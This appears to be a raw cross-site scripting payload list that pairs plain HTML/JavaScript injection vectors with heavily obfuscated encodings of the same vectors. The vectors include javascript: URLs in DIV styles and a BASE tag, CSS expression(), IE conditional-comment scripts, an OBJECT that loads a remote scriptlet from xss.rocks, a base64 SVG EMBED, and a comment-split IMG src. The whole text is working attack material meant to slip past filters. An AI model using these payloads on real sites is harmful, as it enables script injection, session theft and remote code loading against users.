String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<DIV STYLE="background-image: url( javascript:prompt(131))">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[4]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+(false+[0]+"")[7]+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<DIV STYLE="width: expression(prompt(133));">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[4]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[10]+([][""]+"")[4]+(true+"")[0]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<!--[if gte IE 4]> <SCRIPT>prompt(135);</SCRIPT> <![endif]-->
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[13]+([false]+"")[10]+(false+"")[0]+(false+[0]+"")[7]+(false+[0]+"")[2]+(true+"")[0]+(true+"")[3]+(false+[0]+"")[7]+([false]+"")[10]+(true+"")[3]+(false+[0]+"")[7]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+([false]+"")[13]+(true+"")[3]+(undefined+"")[1]+([][""]+"")[4]+([false]+"")[10]+(false+"")[0]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<BASE HREF="javascript:prompt(137);//">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+"")[2]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+"")[2]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[2]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(undefined+"")[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(+(101))["to"+String["name"]]()[1]+(+[]+[])[0]+([][""]+"")[4]+(+(101))["to"+String["name"]]()[1]+(false+[0]+"")[7]+(false+"")[1]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+(undefined+"")[0]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(undefined+"")[0]+([][""]+"")[2]+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[3]+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[4]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(undefined+"")[1]+([false]+"")[10]+([false]+"")[10]+([][""]+"")[2]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(undefined+"")[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(+[]+[])[0]+([false]+"")[10]+(false+"")[1]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(+[]+[])[0]+([false]+"")[3]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[2]+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+([false]+"")[10]+([false]+"")[10]+(+(101))["to"+String["name"]]()[1]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+([][""]+"")[2]+(false+[0]+"")[2]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(+(101))["to"+String["name"]]()[1]+(false+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[3]+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[10]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[4]+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[2]+(undefined+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[2]+(+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+(false+"")[3]+(false+[0]+"")[7]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+([false]+"")[10]+([false]+"")[10]+([][""]+"")[2]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[2]+([][""]+"")[3]+(false+"")[1]+([false]+"")[10]+([false]+"")[10]+(+(101))["to"+String["name"]]()[1]+(false+[0]+"")[2]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[10]+([][""]+"")[3]+(false+"")[1]+([false]+"")[10]+([false]+"")[10]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[10]+([][""]+"")[3]+(false+"")[1]+([false]+"")[10]+([false]+"")[10]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+([false]+"")[10]+([false]+"")[10]+(false+[0]+"")[2]+(+(101))["to"+String["name"]]()[1]+(false+"")[2]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+([][""]+"")[4]+(+[]+[])[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+[0]+"")[7]+([false]+"")[10]+([false]+"")[10]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+([][""]+"")[4]+(+[]+[])[0]+([false]+"")[10]+(true+"")[3]+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+([false]+"")[10]+([][""]+"")[3]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+([false]+"")[10]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+(false+[0]+"")[2]+(undefined+"")[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[10]+(undefined+"")[1]+(true+"")[1]+(false+"")[2]+(true+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([false]+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[2]+([false]+"")[3]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[10]+(false+"")[2]+(+(101))["to"+String["name"]]()[1]+(false+[0]+"")[7]+(true+"")[0]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[1]+(false+"")[2]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+"")[1]+([false]+"")[3]+([false]+"")[3]+(true+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:prompt(143)"></B></I></XML>
